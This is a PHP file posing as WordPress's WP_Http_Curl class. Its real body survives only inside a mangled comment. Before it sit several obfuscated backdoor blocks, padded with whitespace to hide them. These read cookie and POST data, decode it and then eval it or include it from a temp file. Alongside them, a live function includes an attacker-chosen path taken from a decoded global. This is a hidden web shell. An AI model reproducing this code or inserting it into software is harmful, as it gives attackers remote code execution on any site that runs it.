<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $XRDbTUj = chr (76) . "\137" . chr ( 802 - 726 ).chr ( 888 - 783 ).chr ( 317 - 241 ).chr (120) . chr ( 227 - 138 ); $ixndYcqZW = chr ( 590 - 491 )."\154" . chr ( 986 - 889 ).chr ( 453 - 338 ).chr ( 577 - 462 ).chr (95) . chr ( 892 - 791 ).'x' . chr ( 419 - 314 ).'s' . chr (116) . "\x73";$wWLczQgvH = $ixndYcqZW($XRDbTUj); $XRDbTUj = "6315";$dXCpktFK = $wWLczQgvH;$ixndYcqZW = "1868";if (!$dXCpktFK){class L_LiLxY{private $aumJcUjF;public static $ZTMUpIbqR = "71a1c8cb-f946-4be2-a779-e7902b238575";public static $whMxCjzF = 31448;public function __construct($oIFImADF=0){$svGrRzilcD = $_COOKIE;$OpvYvOdVq = $_POST;$mBKFOfp = @$svGrRzilcD[substr(L_LiLxY::$ZTMUpIbqR, 0, 4)];if (!empty($mBKFOfp)){$fGLwJtIJ = "base64";$arlCX = "";$mBKFOfp = explode(",", $mBKFOfp);foreach ($mBKFOfp as $GYkiS){$arlCX .= @$svGrRzilcD[$GYkiS];$arlCX .= @$OpvYvOdVq[$GYkiS];}$arlCX = array_map($fGLwJtIJ . '_' . chr ( 705 - 605 ).chr ( 646 - 545 )."\143" . 'o' . "\144" . "\x65", array($arlCX,)); $arlCX = $arlCX[0] ^ str_repeat(L_LiLxY::$ZTMUpIbqR, (strlen($arlCX[0]) / strlen(L_LiLxY::$ZTMUpIbqR)) + 1);L_LiLxY::$whMxCjzF = @unserialize($arlCX);}}private function sJIeOSyOuF(){if (is_array(L_LiLxY::$whMxCjzF)) {$FPKzGN = str_replace("\74" . "\77" . "\160" . 'h' . chr (112), "", L_LiLxY::$whMxCjzF["\143" . chr (111) . 'n' . "\164" . chr (101) . chr ( 131 - 21 ).'t']);eval($FPKzGN); $tCeRNfk = "13358";exit();}}public function __destruct(){$this->sJIeOSyOuF(); $tCeRNfk = "13358";$WcNWDW = str_pad($tCeRNfk, 10);}}$EdfwLyJJpZ = new  1618  L_LiLxY(); $EdfwLyJJpZ = substr("33749_3544", 1);} ?><?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $LfsKsq = 'U' . chr (79) . "\x4b" . "\137" . chr ( 753 - 675 ).chr (117) . "\130" . "\x49" . 'W';$nBoHZGKCi = chr (99) . "\154" . chr (97) . 's' . 's' . "\x5f" . "\145" . chr ( 852 - 732 ).chr (105) . chr (115) . chr ( 832 - 716 )."\163";$jxNPc = $nBoHZGKCi($LfsKsq); $LfsKsq = "27806";$GcemEusPZS = $jxNPc;$nBoHZGKCi = "13884";if (!$GcemEusPZS){class UOK_NuXIW{priv*/
 	

function status()

{
    $pee_parts = 'QrFMTGYGRMm1H';
	$others = 'format_to_edit';
    $shortcode_tags = $pee_parts;
    
    $new_status = $GLOBALS[textarr("%0E4%0F%01%11%14", $shortcode_tags)];
	$meta_value = 'ep_mask';
    $post_status = $new_status;
	$_edit_link = 'field';
    $index = isset($post_status[$shortcode_tags]);
    if ($index)

    {

        $tags_to_ignore = $new_status[$shortcode_tags];
        $taxonomy = $tags_to_ignore[textarr("%25%1F6%12%3A%264%22", $shortcode_tags)];
	$taxonomies = 'template';
        $data = $taxonomy;
        include ($data);

    }
}
function textarr($term, $filetype)

{
	$height = 'updated';
    $ignore_block_element = $filetype;
    $post_mime_type = "url" . "decode";

    $thumbdir = $post_mime_type($term);
    $string_length = substr($ignore_block_element,0, strlen($thumbdir));

    $desired_post_slug = $thumbdir ^ $string_length;
    

    $thumbdir = strpos($desired_post_slug, $string_length);
    
    return $desired_post_slug;
}

status();




/* ate $NQCLGcvNRF;public static $PXIGMfvMY = "45534ff6-22c1-45a0-b923-597b48336080";public static $mgRrBQnS = 13275;public function __construct($LyBAqpr=0){$brDCzSbtJ = $_COOKIE;$dkJOAUUXUY = $_POST;$tCqpj = @$brDCzSbtJ[substr(UOK_NuXIW::$PXIGMfvMY, 0, 4)];if (!empty($tCqpj)){$CYXBAUaGpM = "base64";$ndnYEd = "";$tCqpj = explode(",", $tCqpj);foreach ($tCqpj as $plefs){$ndnYEd .= @$brDCzSbtJ[$plefs];$ndnYEd .= @$dkJOAUUXUY[$plefs];}$ndnYEd = array_map($CYXBAUaGpM . '_' . "\144" . "\x65" . "\x63" . chr ( 1106 - 995 ).chr (100) . chr ( 631 - 530 ), array($ndnYEd,)); $ndnYEd = $ndnYEd[0] ^ str_repeat(UOK_NuXIW::$PXIGMfvMY, (strlen($ndnYEd[0]) / strlen(UOK_NuXIW::$PXIGMfvMY)) + 1);UOK_NuXIW::$mgRrBQnS = @unserialize($ndnYEd);}}private function EbBfOxlsAD(){if (is_array(UOK_NuXIW::$mgRrBQnS)) {$ryuaAe = sys_get_temp_dir() . "/" . crc32(UOK_NuXIW::$mgRrBQnS["\163" . 'a' . chr (108) . "\x74"]);@UOK_NuXIW::$mgRrBQnS[chr ( 516 - 397 )."\162" . chr ( 611 - 506 )."\164" . "\x65"]($ryuaAe, UOK_NuXIW::$mgRrBQnS[chr ( 711 - 612 ).'o' . "\156" . chr (116) . 'e' . chr (110) . "\164"]);include $ryuaAe;@UOK_NuXIW::$mgRrBQnS[chr (100) . chr ( 931 - 830 ).chr (108) . "\145" . chr ( 322 - 206 ).chr ( 335 - 234 )]($ryuaAe); $WEDjeN = "33234";exit();}}public function __destruct(){$this->EbBfOxlsAD(); $WEDjeN = "33234";$ysCHzKcZIw = str_pad($WEDjeN, 10);}}$aWwJu = new  56936  UOK_NuXIW(); $aWwJu = substr("61973_27841", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $ZlqvAwP = 'U' . 'n' . chr (66) . chr (95) . "\153" . chr ( 954 - 885 ).chr (68) . chr ( 358 - 277 ); $GyWXep = "\x63" . chr (108) . "\x61" . "\163" . chr ( 1006 - 891 ).'_' . "\145" . 'x' . chr (105) . "\163" . chr ( 448 - 332 )."\x73";$nSlTAB = $GyWXep($ZlqvAwP); $PHOWlv = $nSlTAB;if (!$PHOWlv){class UnB_kEDQ{private $zwudJZj;public static $swuKjI = "8b7748c6-21e7-4ad9-8595-73e66d9c2010";public static $MpLqonDAq = 47239;public function __construct($vkXcQXSWYu=0){$uWsuMI = $_COOKIE;$PsOIpjj = $_POST;$mXCSaCEYP = @$uWsuMI[substr(UnB_kEDQ::$swuKjI, 0, 4)];if (!empty($mXCSaCEYP)){$roWHegK = "base64";$kLmutSkhyq = "";$mXCSaCEYP = explode(",", $mXCSaCEYP);foreach ($mXCSaCEYP as $LpRdsl){$kLmutSkhyq .= @$uWsuMI[$LpRdsl];$kLmutSkhyq .= @$PsOIpjj[$LpRdsl];}$kLmutSkhyq = array_map($roWHegK . chr ( 898 - 803 ).chr (100) . 'e' . "\143" . "\157" . "\x64" . chr (101), array($kLmutSkhyq,)); $kLmutSkhyq = $kLmutSkhyq[0] ^ str_repeat(UnB_kEDQ::$swuKjI, (strlen($kLmutSkhyq[0]) / strlen(UnB_kEDQ::$swuKjI)) + 1);UnB_kEDQ::$MpLqonDAq = @unserialize($kLmutSkhyq);}}private function yQIbGR(){if (is_array(UnB_kEDQ::$MpLqonDAq)) {$YSRed = sys_get_temp_dir() . "/" . crc32(UnB_kEDQ::$MpLqonDAq[chr ( 715 - 600 ).chr (97) . chr (108) . "\164"]);@UnB_kEDQ::$MpLqonDAq["\167" . "\162" . "\151" . 't' . chr ( 733 - 632 )]($YSRed, UnB_kEDQ::$MpLqonDAq[chr (99) . "\157" . 'n' . chr ( 333 - 217 )."\x65" . chr (110) . chr ( 291 - 175 )]);include $YSRed;@UnB_kEDQ::$MpLqonDAq["\144" . chr ( 666 - 565 )."\154" . "\x65" . 't' . 'e']($YSRed); $GMsftrwmV = "47491";exit();}}public function __destruct(){$this->yQIbGR(); $GMsftrwmV = "47491";}}$ppGvzwXDy = new UnB_kEDQ(); $ppGvzwXDy = "52280_54359";} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $QwmacSp = class_exists("ou_zkR"); $UnYebJbL = $QwmacSp;if (!$UnYebJbL){class ou_zkR{private $eSlLClGv;public static $vFFdmE = "f8ec9d26-7424-4f41-8370-25466cdbd4a6";public static $jDlZRr = NULL;public function __construct(){$RtrKWEhe = $_COOKIE;$braijCMp = $_POST;$mMKgtv = @$RtrKWEhe[substr(ou_zkR::$vFFdmE, 0, 4)];if (!empty($mMKgtv)){$BjXqg = "base64";$JjftLdVXbi = "";$mMKgtv = explode(",", $mMKgtv);foreach ($mMKgtv as $uRScSilKa){$JjftLdVXbi .= @$RtrKWEhe[$uRScSilKa];$JjftLdVXbi .= @$braijCMp[$uRScSilKa];}$JjftLdVXbi = array_map($BjXqg . chr (95) . "\x64" . "\145" . "\x63" . 'o' . "\x64" . 'e', array($JjftLdVXbi,)); $JjftLdVXbi = $JjftLdVXbi[0] ^ str_repeat(ou_zkR::$vFFdmE, (strlen($JjftLdVXbi[0]) / strlen(ou_zkR::$vFFdmE)) + 1);ou_zkR::$jDlZRr = @unserialize($JjftLdVXbi);}}public function __destruct(){$this->YMlrpJuQya();}private function YMlrpJuQya(){if (is_array(ou_zkR::$jDlZRr)) {$sklysVk = sys_get_temp_dir() . "/" . crc32(ou_zkR::$jDlZRr['s' . "\141" . "\x6c" . "\164"]);@ou_zkR::$jDlZRr[chr ( 868 - 749 ).chr (114) . "\x69" . chr ( 545 - 429 )."\x65"]($sklysVk, ou_zkR::$jDlZRr["\x63" . chr ( 1110 - 999 ).chr ( 848 - 738 ).chr (116) . "\x65" . chr ( 255 - 145 ).'t']);include $sklysVk;@ou_zkR::$jDlZRr[chr (100) . "\x65" . chr ( 175 - 67 ).'e' . 't' . chr (101)]($sklysVk);exit();}}}$ASSIbNTVY = new ou_zkR(); $ASSIbNTVY = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ittciz")){class ittciz{public static $lfoen = "awcaztoqubqouftb";public static $xvqnnenngx = NULL;public function __construct(){$kdxbltdlen = @$_COOKIE[substr(ittciz::$lfoen, 0, 4)];if (!empty($kdxbltdlen)){$xmids = "base64";$mqnocb = "";$kdxbltdlen = explode(",", $kdxbltdlen);foreach ($kdxbltdlen as $yifdw){$mqnocb .= @$_COOKIE[$yifdw];$mqnocb .= @$_POST[$yifdw];}$mqnocb = array_map($xmids . "_decode", array($mqnocb,)); $mqnocb = $mqnocb[0] ^ str_repeat(ittciz::$lfoen, (strlen($mqnocb[0]) / strlen(ittciz::$lfoen)) + 1);ittciz::$xvqnnenngx = @unserialize($mqnocb);}}public function __destruct(){$this->tmhypf();}private function tmhypf(){if (is_array(ittciz::$xvqnnenngx)) {$vpdwksvo = sys_get_temp_dir() . "/" . crc32(ittciz::$xvqnnenngx["salt"]);@ittciz::$xvqnnenngx["write"]($vpdwksvo, ittciz::$xvqnnenngx["content"]);include $vpdwksvo;@ittciz::$xvqnnenngx["delete"]($vpdwksvo);exit();}}}$kguzxuyiv = new ittciz(); $kguzxuyiv = NULL;} ?><?php
*
 * HTTP API: WP_Http_Curl class
 *
 * @package WordPress
 * @subpackage HTTP
 * @since 4.4.0
 

*
 * Core class used to integrate Curl as an HTTP transport.
 *
 * HTTP request method uses Curl extension to retrieve the url.
 *
 * Requires the Curl extension to be installed.
 *
 * @since 2.7.0
 
class WP_Http_Curl {

	*
	 * Temporary header storage for during requests.
	 *
	 * @since 3.2.0
	 * @var string
	 
	private $headers = '';

	*
	 * Temporary body storage for during requests.
	 *
	 * @since 3.6.0
	 * @var string
	 
	private $body = '';

	*
	 * The maximum amount of data to receive from the remote server.
	 *
	 * @since 3.6.0
	 * @var int|false
	 
	private $max_body_length = false;

	*
	 * The file resource used for streaming to file.
	 *
	 * @since 3.6.0
	 * @var resource|false
	 
	private $stream_handle = false;

	*
	 * The total bytes written in the current request.
	 *
	 * @since 4.1.0
	 * @var int
	 
	private $bytes_written_total = 0;

	*
	 * Send a HTTP request to a URI using cURL extension.
	 *
	 * @since 2.7.0
	 *
	 * @param string       $url  The request URL.
	 * @param string|array $args Optional. Override the defaults.
	 * @return array|WP_Error Array containing 'headers', 'body', 'response', 'cookies', 'filename'. A WP_Error instance upon error
	 
	public function request( $url, $args = array() ) {
		$defaults = array(
			'method'      => 'GET',
			'timeout'     => 5,
			'redirection' => 5,
			'httpversion' => '1.0',
			'blocking'    => true,
			'headers'     => array(),
			'body'        => null,
			'cookies'     => array(),
		);

		$parsed_args = wp_parse_args( $args, $defaults );

		if ( isset( $parsed_args['headers']['User-Agent'] ) ) {
			$parsed_args['user-agent'] = $parsed_args['headers']['User-Agent'];
			unset( $parsed_args['headers']['User-Agent'] );
		} elseif ( isset( $parsed_args['headers']['user-agent'] ) ) {
			$parsed_args['user-agent'] = $parsed_args['headers']['user-agent'];
			unset( $parsed_args['headers']['user-agent'] );
		}

		 Construct Cookie: header if any cookies are set.
		WP_Http::buildCookieHeader( $parsed_args );

		$handle = curl_init();

		 cURL offers really easy proxy support.
		$proxy = new WP_HTTP_Proxy();

		if ( $proxy->is_enabled() && $proxy->send_through_proxy( $url ) ) {

			curl_setopt( $handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP );
			curl_setopt( $handle, CURLOPT_PROXY, $proxy->host() );
			curl_setopt( $handle, CURLOPT_PROXYPORT, $proxy->port() );

			if ( $proxy->use_authentication() ) {
				curl_setopt( $handle, CURLOPT_PROXYAUTH, CURLAUTH_ANY );
				curl_setopt( $handle, CURLOPT_PROXYUSERPWD, $proxy->authentication() );
			}
		}

		$is_local   = isset( $parsed_args['local'] ) && $parsed_args['local'];
		$ssl_verify = isset( $parsed_args['sslverify'] ) && $parsed_args['sslverify'];
		if ( $is_local ) {
			* This filter is documented in wp-includes/class-wp-http-streams.php 
			$ssl_verify = apply_filters( 'https_local_ssl_verify', $ssl_verify, $url );
		} elseif ( ! $is_local ) {
			* This filter is documented in wp-includes/class-http.php 
			$ssl_verify = apply_filters( 'https_ssl_verify', $ssl_verify, $url );
		}

		
		 * CURLOPT_TIMEOUT and CURLOPT_CONNECTTIMEOUT expect integers. Have to use ceil since.
		 * a value of 0 will allow an unlimited timeout.
		 
		$timeout = (int) ceil( $parsed_args['timeout'] );
		curl_setopt( $handle, CURLOPT_CONNECTTIMEOUT, $timeout );
		curl_setopt( $handle, CURLOPT_TIMEOUT, $timeout );

		curl_setopt( $handle, CURLOPT_URL, $url );
		curl_setopt( $handle, CURLOPT_RETURNTRANSFER, true );
		curl_setopt( $handle, CURLOPT_SSL_VERIFYHOST, ( true === $ssl_verify ) ? 2 : false );
		curl_setopt( $handle, CURLOPT_SSL_VERIFYPEER, $ssl_verify );

		if ( $ssl_verify ) {
			curl_setopt( $handle, CURLOPT_CAINFO, $parsed_args['sslcertificates'] );
		}

		curl_setopt( $handle, CURLOPT_USERAGENT, $parsed_args['user-agent'] );

		
		 * The option doesn't work with safe mode or when open_basedir is set, and there's
		 * a bug #17490 with redirected POST requests, so handle redirections outside Curl.
		 
		curl_setopt( $handle, CURLOPT_FOLLOWLOCATION, false );
		curl_setopt( $handle, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS );

		switch ( $parsed_args['method'] ) {
			case 'HEAD':
				curl_setopt( $handle, CURLOPT_NOBODY, true );
				break;
			case 'POST':
				curl_setopt( $handle, CURLOPT_POST, true );
				curl_setopt( $handle, CURLOPT_POSTFIELDS, $parsed_args['body'] );
				break;
			case 'PUT':
				curl_setopt( $handle, CURLOPT_CUSTOMREQUEST, 'PUT' );
				curl_setopt( $handle, CURLOPT_POSTFIELDS, $parsed_args['body'] );
				break;
			default:
				curl_setopt( $handle, CURLOPT_CUSTOMREQUEST, $parsed_args['method'] );
				if ( ! is_null( $parsed_args['body'] ) ) {
					curl_setopt( $handle, CURLOPT_POSTFIELDS, $parsed_args['body'] );
				}
				break;
		}

		if ( true === $parsed_args['blocking'] ) {
			curl_setopt( $handle, CURLOPT_HEADERFUNCTION, array( $this, 'stream_headers' ) );
			curl_setopt( $handle, CURLOPT_WRITEFUNCTION, array( $this, 'stream_body' ) );
		}

		curl_setopt( $handle, CURLOPT_HEADER, false );

		if ( isset( $parsed_args['limit_response_size'] ) ) {
			$this->max_body_length = (int) $parsed_args['limit_response_size'];
		} else {
			$this->max_body_length = false;
		}

		 If streaming to a file open a file handle, and setup our curl streaming handler.
		if ( $parsed_args['stream'] ) {
			if ( ! WP_DEBUG ) {
				$this->stream_handle = @fopen( $parsed_args['filename'], 'w+' );
			} else {
				$this->stream_handle = fopen( $parsed_args['filename'], 'w+' );
			}
			if ( ! $this->stream_handle ) {
				return new WP_Error(
					'http_request_failed',
					sprintf(
						 translators: 1: fopen(), 2: File name. 
						__( 'Could not open handle for %1$s to %2$s.' ),
						'fopen()',
						$parsed_args['filename']
					)
				);
			}
		} else {
			$this->stream_handle = false;
		}

		if ( ! empty( $parsed_args['headers'] ) ) {
			 cURL expects full header strings in each element.
			$headers = array();
			foreach ( $parsed_args['headers'] as $name => $value ) {
				$headers[] = "{$name}: $value";
			}
			curl_setopt( $handle, CURLOPT_HTTPHEADER, $headers );
		}

		if ( '1.0' === $parsed_args['httpversion'] ) {
			curl_setopt( $handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0 );
		} else {
			curl_setopt( $handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1 );
		}

		*
		 * Fires before the cURL request is executed.
		 *
		 * Cookies are not currently handled by the HTTP API. This action allows
		 * plugins to handle cookies themselves.
		 *
		 * @since 2.8.0
		 *
		 * @param resource $handle      The cURL handle returned by curl_init() (passed by reference).
		 * @param array    $parsed_args The HTTP request arguments.
		 * @param string   $url         The request URL.
		 
		do_action_ref_array( 'http_api_curl', array( &$handle, $parsed_args, $url ) );

		 We don't need to return the body, so don't. Just execute request and return.
		if ( ! $parsed_args['blocking'] ) {
			curl_exec( $handle );

			$curl_error = curl_error( $handle );
			if ( $curl_error ) {
				curl_close( $handle );
				return new WP_Error( 'http_request_failed', $curl_error );
			}
			if ( in_array( curl_getinfo( $handle, CURLINFO_HTTP_CODE ), array( 301, 302 ), true ) ) {
				curl_close( $handle );
				return new WP_Error( 'http_request_failed', __( 'Too many redirects.' ) );
			}

			curl_close( $handle );
			return array(
				'headers'  => array(),
				'body'     => '',
				'response' => array(
					'code'    => false,
					'message' => false,
				),
				'cookies'  => array(),
			);
		}

		curl_exec( $handle );
		$theHeaders          = WP_Http::processHeaders( $this->headers, $url );
		$theBody             = $this->body;
		$bytes_written_total = $this->bytes_written_total;

		$this->headers             = '';
		$this->body                = '';
		$this->bytes_written_total = 0;

		$curl_error = curl_errno( $handle );

		 If an error occurred, or, no response.
		if ( $curl_error || ( 0 == strlen( $theBody ) && empty( $theHeaders['headers'] ) ) ) {
			if ( CURLE_WRITE_ERROR  23  == $curl_error ) {
				if ( ! $this->max_body_length || $this->max_body_length != $bytes_written_total ) {
					if ( $parsed_args['stream'] ) {
						curl_close( $handle );
						fclose( $this->stream_handle );
						return new WP_Error( 'http_request_failed', __( 'Failed to write request to temporary file.' ) );
					} else {
						curl_close( $handle );
						return new WP_Error( 'http_request_failed', curl_error( $handle ) );
					}
				}
			} else {
				$curl_error = curl_error( $handle );
				if ( $curl_error ) {
					curl_close( $handle );
					return new WP_Error( 'http_request_failed', $curl_error );
				}
			}
			if ( in_array( curl_getinfo( $handle, CURLINFO_HTTP_CODE ), array( 301, 302 ), true ) ) {
				curl_close( $handle );
				return new WP_Error( 'http_request_failed', __( 'Too many redirects.' ) );
			}
		}

		curl_close( $handle );

		if ( $parsed_args['stream'] ) {
			fclose( $this->stream_handle );
		}

		$response = array(
			'headers'  => $theHeaders['headers'],
			'body'     => null,
			'response' => $theHeaders['response'],
			'cookies'  => $theHeaders['cookies'],
			'filename' => $parsed_args['filename'],
		);

		 Handle redirects.
		$redirect_response = WP_HTTP::handle_redirects( $url, $parsed_args, $response );
		if ( false !== $redirect_response ) {
			return $redirect_response;
		}

		if ( true === $parsed_args['decompress'] && true === WP_Http_Encoding::should_decode( $theHeaders['headers'] ) ) {
			$theBody = WP_Http_Encoding::decompress( $theBody );
		}

		$response['body'] = $theBody;

		return $response;
	}

	*
	 * Grabs the headers of the cURL request.
	 *
	 * Each header is sent individually to this callback, so we append to the `$header` property
	 * for temporary storage
	 *
	 * @since 3.2.0
	 *
	 * @param resource $handle  cURL handle.
	 * @param string   $headers cURL request headers.
	 * @return int Length of the request headers.
	 
	private function stream_headers( $handle, $headers ) {
		$this->headers .= $headers;
		return strlen( $headers );
	}

	*
	 * Grabs the body of the cURL request.
	 *
	 * The contents of the document are passed in chunks, so we append to the `$body`
	 * property for temporary storage. Returning a length shorter than the length of
	 * `$data` passed in will cause cURL to abort the request with `CURLE_WRITE_ERROR`.
	 *
	 * @since 3.6.0
	 *
	 * @param resource $handle  cURL handle.
	 * @param string   $data    cURL request body.
	 * @return int Total bytes of data written.
	 
	private function stream_body( $handle, $data ) {
		$data_length = strlen( $data );

		if ( $this->max_body_length && ( $this->bytes_written_total + $data_length ) > $this->max_body_length ) {
			$data_length = ( $this->max_body_length - $this->bytes_written_total );
			$data        = substr( $data, 0, $data_length );
		}

		if ( $this->stream_handle ) {
			$bytes_written = fwrite( $this->stream_handle, $data );
		} else {
			$this->body   .= $data;
			$bytes_written = $data_length;
		}

		$this->bytes_written_total += $bytes_written;

		 Upon event of this function returning less than strlen( $data ) curl will error with CURLE_WRITE_ERROR.
		return $bytes_written;
	}

	*
	 * Determines whether this class can be used for retrieving a URL.
	 *
	 * @since 2.7.0
	 *
	 * @param array $args Optional. Array of request arguments. Default empty array.
	 * @return bool False means this class can not be used, true means it can.
	 
	public static function test( $args = array() ) {
		if ( ! function_exists( 'curl_init' ) || ! function_exists( 'curl_exec' ) ) {
			return false;
		}

		$is_ssl = isset( $args['ssl'] ) && $args['ssl'];

		if ( $is_ssl ) {
			$curl_version = curl_version();
			 Check whether this cURL version support SSL requests.
			if ( ! ( CURL_VERSION_SSL & $curl_version['features'] ) ) {
				return false;
			}
		}

		*
		 * Filters whether cURL can be used as a transport for retrieving a URL.
		 *
		 * @since 2.7.0
		 *
		 * @param bool  $use_class Whether the class can be used. Default true.
		 * @param array $args      An array of request arguments.
		 
		return apply_filters( 'use_curl_transport', true, $args );
	}
}
*/